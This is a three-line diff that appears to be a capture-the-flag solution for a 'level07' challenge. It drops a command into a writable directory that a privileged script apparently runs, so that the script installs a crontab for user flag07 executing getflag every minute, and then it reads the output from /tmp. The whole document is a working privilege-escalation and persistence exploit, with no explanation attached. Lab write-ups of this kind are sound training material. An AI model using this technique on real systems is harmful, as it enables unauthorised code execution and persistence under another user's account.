@@ -1,0 +1,3 @@
+echo 'echo "* * * * * getflag > /tmp/faaaggggg" | crontab -u flag07 -' > writable.d/lol
+./level07.sh
+cat /tmp/faaaggggg
